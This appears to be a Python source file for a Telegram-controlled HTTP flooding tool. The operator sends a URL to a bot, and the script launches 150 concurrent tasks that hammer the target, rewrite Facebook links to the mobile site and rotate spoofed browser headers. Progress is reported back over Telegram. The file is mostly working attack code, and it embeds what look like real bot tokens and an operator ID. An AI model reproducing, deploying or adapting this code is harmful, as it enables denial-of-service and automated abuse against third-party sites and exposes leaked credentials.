import asyncio
import aiohttp
import random
from aiohttp import web

MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
MASTER_ID = 1938591484
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0", "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE", "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI", "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo", "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI", "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}

class AIP2K_Pure_Core:
    def __init__(self):
        self.session = None
        self.target = ""
        self.success = 0
        self.failed = 0
        self.active = False
        self.identities = {}

    async def _fetch_names(self):
        for k, v in SLAVE_ARMY.items():
            try:
                async with self.session.get(f"https://api.telegram.org/bot{v}/getMe") as r:
                    d = await r.json()
                    self.identities[k] = f"@{d['result']['username']}" if d.get('ok') else f"Bot_{k}"
            except: self.identities[k] = f"Err_{k}"

    async def _notify(self, text):
        print(f"[AIP2K-SYNC] {text}")
        url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
        try: await self.session.post(url, json={'chat_id': MASTER_ID, 'text': text})
        except: pass

    async def _strike(self):
        while self.active and self.target:
            agents = [
                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
            ]
            h = {
                'User-Agent': random.choice(agents),
                'Referer': 'https://www.google.com/',
                'Accept-Language': 'en-US,en;q=0.9'
            }
            try:
                m_target = self.target.replace("www.facebook", "mbasic.facebook")
                async with self.session.get(m_target, headers=h, timeout=10) as r:
                    if r.status == 200: 
                        self.success += 1
                    else: 
                        self.failed += 1
            except: 
                self.failed += 1
            
            if (self.success + self.failed) % 300 == 0:
                rep = f"📊 RAW REPORT: ✅ {self.success} | ❌ {self.failed}"
                asyncio.create_task(self._notify(rep))
            
            await asyncio.sleep(random.uniform(0.05, 0.1))

    async def handle_updates(self):
        offset = 0
        await self._fetch_names()
        await self._notify("🔱 AIP2K PURE ENGINE ONLINE")
        while True:
            try:
                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}"
                async with self.session.get(url) as r:
                    data = await r.json()
                    for u in data.get('result', []):
                        offset = u['update_id'] + 1
                        m = u.get('message', {})
                        text = m.get('text', '')
                        if m.get('from', {}).get('id') != MASTER_ID: continue
                        
                        if text.startswith("http"):
                            self.target = text; self.active = True; self.success = 0; self.failed = 0
                            await self._notify(f"⚔️ ATTACK: {text}")
                            for _ in range(150): asyncio.create_task(self._strike())
                        elif text == "/check":
                            msg = "🔎 STATUS:\n" + "\n".join([f"✅ {v}" for v in self.identities.values()])
                            await self._notify(msg)
                        elif text == "/stop":
                            self.active = False
                            await self._notify(f"🛑 STOPPED. SUCCESS: {self.success} | FAILED: {self.failed}")
            except: await asyncio.sleep(1)

async def main():
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=50)) as sess:
        bot = AIP2K_Pure_Core(); bot.session = sess
        app = web.Application(); runner = web.AppRunner(app)
        await runner.setup(); await web.TCPSite(runner, '0.0.0.0', 10000).start()
        await bot.handle_updates()

if __name__ == "__main__": asyncio.run(main())
    
